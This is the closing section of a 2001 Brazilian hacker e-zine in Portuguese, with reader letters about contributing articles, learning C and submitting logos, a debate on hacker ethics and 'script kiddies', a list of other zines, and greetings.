>poderia contribuir com algo na sua coluna, na verdade estou muito inferrujado,
>nao sei se poderei ajudar, mas sinceramente, estou disposto a fazer o que puder
>e o que meu tempo permitir para contribuir com seu zine e mostrar um pouco do
>que eu sei.
>
>Temas que estou mais interado :
>- Phreak
>- Vandalismo (1001 maneiras de matar uma pessoa sem ser suspeito?)HEeh mas que
>maldade... inspirado na brincadeira dos TDK..
>- Criticas em geral
>
>Desde de j agradecido,                     AvanT.VangarD
>(mesmo depois de vei, mas ainda na ativa, alias, pra q VIAGRA?)
-----------------------------------------------------------

   Bom... o que posso dizer...
   Toda a colaboracao eh bem vinda, porem ela passa por um rigoroso
processo de avaliacao. Se tu quer fazer esse bem a humanidade e 
compartilhar um pouco do seu conhecimento mesmo q inferrujado, faca
uma (ou +) materia sobre um assunto que vc manje e me envie.
   Eu aviso caso va publicar ou nao.
   Sobre os temas q vc citou, soh nao sera aceito Vandalismo pois ateh
agora, nenhum tema anarchy foi bem aceito pelo publico. Phreaking e 
criticas ainda sao bem vindos.
   Usando suas palavras: Desde de ja agradecido (por futuras colaboracoes).



#################################################
From :    "********* ******" <******@hotmail.com>  
Subject :    programacao  
Date :    Fri, 28 Dec 2001 00:05:32 +0000  

>ae Struck 
>eu estou aprendendo a programar em C e, tipo.. serah q vc nao podia me 
>recomendar algum tutorial ou livro sobre???? estou com dificuldade em achar 
>material bom sobre linguagem C. espero q possa me ajudar. 
>valeu! 
-----------------------------------------------------------

   Pra mim nenhuma documentacao ajudou mais do que as man pages do
linux. Se voce tiver duvida sobre alguma funcao de C que estejam
na biblioteca padrao do seu linux, provavelmente encontrara um
manual sobre ela (Se voce instalou as man pages).
   Para quem nao sabe ainda:

shell# man printf
shell# man strcmp
...

   Livro de C, o unico que cheguei a ler foi "C - Completo e Total" q
nao lembro o autor nem a editora. Meu professor de programacao disse
q era o mais completo sobre C entao nao deve ser dificil de achar.
   Minha opiniao pessoal sobre o livro eh que ele eh bom para quem ta
comecando, mas se vc ja tem as bases, nao vale a pena gastar R$100 nele.
Se vc sabe onde fica a biblioteca da sua faculdade ou escola, vale a
pena alugar soh pra tirar duvidas rapidas sobre a linguagem.


##################################
From :    *********@zipmail.com.br  
Subject :    Logos  
Date :    Thu, 27 Dec 2001 12:17:41 -0200  
Attachment :   logos.zip (145k)    
   
>E ae tudo blz!?
>Hah um bom tempo jah sigo a sua sua zine e acho ela muito boa.
>Eu vi a promocao dos logos da Fatal 3rror e resolvi fazer uns logos, ficaram
>meio feios, eu usei tecnicas manjadas de photoshop, mas se vc quiser pode
>aproveitah-los. Eu praticamente jah desisti do hacking, pois o ano q vem
>2002, vou fazer o 3 col. e eu acho q naum vai sobrar tempo pra me dedicar
>a isso, eu nem tenho jeito de aprender muito pois agora na minha cidadezinha
>(sul de MG) tah sem provedor entaum eu soh conecto ahs vezes pelo lig-br,
>e eu nem tenho linux, porq naum eh soh eu q uso o PC em casa e meu HD eh
>pequeno d+ p/ colocar um linux junto, mas deixa de blah-blah-blah.
>T+ e parabens pela zine.
>[]'s
-----------------------------------------------------------

   Aeeeeeee!!!
   Voce foi o primeiro e unico a participar da nossa promocao!!!
   Achu q vc foi o unico q deve ter lido-a. O resto do povo que ta lendo
esse email agora deve ter se perguntado "Que promocao eh essa?". Porra!
Isso q da nao ler introducoes nem conclusoes da f3.
   Ainda bem q alguem leu e...
   ...
   PORRA!!! Ceis nao sabem ler nao???? Olhem na f3-05!!!! la no fim! A
promocao dizia q era pra fazer o log em ASCII e nao em jpg!!!!
   asfdsadsasadasfsdfsadsd!!!
   Bem... como ninguem se interessou e o unico que se interessou nao
leu as regras do jogo (puts), a promocao acabou e o log que vai ficar
eh este mesmo que nos acompanha desde a f3-02.
   Heheheh... querem ver como agora o pessoal vai mandar os asciis.


###########################################
From :    Nash Leon <nashleon@yahoo.com.br>  
Subject :    RE: replica a sua replica...  
Date :    Thu, 22 Nov 2001 11:45:09 -0300 (ART)  

>
-----------------------------------------------------------

   Bem... vcs que leram na edicao passada a critica q fiz a etica
da unsekurity pregada por nashleon deviam estar esperando nesta
edicao alguma resposta `a replica dele publicada em:
http://coracaodeleao.virtualave.net/man/kiddieresp.txt
   Pois lamento informar que a replica foi enviada diretamente a
esta pessoa e nao pretendo publicar nada para nao puchar mais pinos
de granadas.
   A troca de emails q tivemos serviu para apenas debater alguns
assuntos como diferencas entre admins e analistas de seguranca, Kevin
Mitnick, etc... porem nenhum dos dois lados cedeu as pregacoes do outro.
   Depois de mta reflexao minhas conclusoes sobre este assunto foram:
   Nashleon eh um cara que leva tao a serio o hacking que nao suporta
ver pessoas q nao sao hackers na visao dele obterem tal fama seja por
defaces, ou qquer outro meio.
   Para ele scriptkiddie eh o kra que usa o hacking para obter fama,
coisa que eu nao concordo, para mim sk eh o kra que usa programas de
terceiros para hackear. Nisso os dois lados tem suas conclusoes
diferentes e segundo ele eu seria um sk pois uso a zine apenas para
obter fama.
   Ele prega uma etica a ser seguida para a pessoa ser considerada
hacker, eu no entanto nao sigo sua etica e portanto lhe dou outro 
motivo para me considerar um scriptkiddie.
   Agora soh para nao deixar vago meu pensamento sobre etica:

   Acredito q cada pessoa deve formar sua etica pessoal baseado em sua
experiencia de vida. Quando vc eh crianca, vc faz o q seus pais mandam
pois nao viveu o suficiente criar suas proprias regras. Quando chega a
adolescencia passa a discordar com seus pais pois ja c acha experiente
o suficiente para criticar com as regras q lhe impuseram.
   O que eu nao entendo eh como varias pessoas adultas ainda agem como
criancas que precisam que os outros lhes digam o que eh certo e o que
eh errado.
   Como o proprio nashleon diz: "Sejam criticos".
   Ser critico nao eh apenas mostrar um ponto de vista diferente sobre
algum assunto em particular. Ser critico eh tem corajem de contrariar 
todo um pensamento de vida de uma pessoa ou um grupo, mesmo sabendo das
consequencias. Eu fui apenas critico na edicao passada.
   Pra finalizar de vez esse assunto, eu nao estou interessado com isso
mudar o pensamento de ninguem. Apenas mostrei minhas opinioes, nao quero
que amanha o pessoal venha falar q segue a etica fatal3rror ou a etica
struck. Tomem decisoes por si mesmos, nao deixem q eu ou ninguem venha
lhe dizer o que fazer.
   Isso ae.









        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~         16 - E o F         ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat Struck        _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~

   Aki acaba a edicao de 2o aniversario da fatal 3rror. 
   Qualquer critica a zine ou a seus autores enviem para os 
respectivos emails.
   Nao esquecam de baixar o Geug em:
http://struck.securitynetworks.com.br/geug
   e qquer sugestao, bug, critica, etc q tiverem para o jogo, 
mandem um email.

   Fazendo agora akela propaganda gratuita...
   Pra vc que leu toda essa edicao da f3 mas como ta viciado e tem
que ler mais e mais.... aki vai uma pequena lista de zines brasileiras
que, creio eu, ainda estao na ativa...

* BaitesBrasil
   Editor chefe: QuickBasic
   Conteudo: Hacking em geral
   Download: http://www.baitesbrasil.cjb.net
* I N F O . F O R . A L L
   Editor chefe: Morfeu
   Conteudo: estritamente linux
   Download: http://www.infoforall.cjb.net
* O W N E D B R    E - Z I N E
   Editor chefe: N3tbug
   Conteudo: Hacking em geral
   Comentario: As minhas materias publicadas sao originalmente da f3 e 
               nao tenho nenhuma relacao com esta zine.
   Download: http://www.ownedbr.cjb.net
* T H E  ^  C  Z A R
   Editor chefe: C/ROMANO
   Conteudo: programacao em C
   Download: http://www.geocities.com/czzine
* THIRD EYE ZINE
   Editor chefe: TeCnEt
   Conteudo: Hacking em geral
   Download: http://www.thirdeye.8m.com
* ZINES BR
   Editor chefe: Gotoxy
   Conteudo: Hacking em geral
   Download: http://zinesbr.hpg.com.br

   Provavelmente deve ter faltada alguma. Se voce tem uma zine tb e quer
usufluir desta propaganda gratuita, mande um email informando.

   Agora vamos aos gr33ts:


^^VENTO^^         Hm... 
`pcmcia           Ja
alex              inventei
appletalk         tanta
BEHAEL            historia
Bele              para 
Cacaio            esses
Carti             caras
chm0d             que
Dave Mustaine     acabei
Doty              ficando
dRo               sem
Encripty          ideias
flash             sobre
hak               o
Kamikase Shell    q
MidNight          colocar
mild7             de
mph               engracado
N4rfy             aqui...
onlooker          ...
pcHazard          Nao
psaux             consigo
RoadHouse         pensar
Slash_DOMI        em
snape             nada
Source            mesmo!
Tate              ...
Tinkertrain       Ah!!!
TPGA              Ja'
Wohnrath          sei...


_EoF_
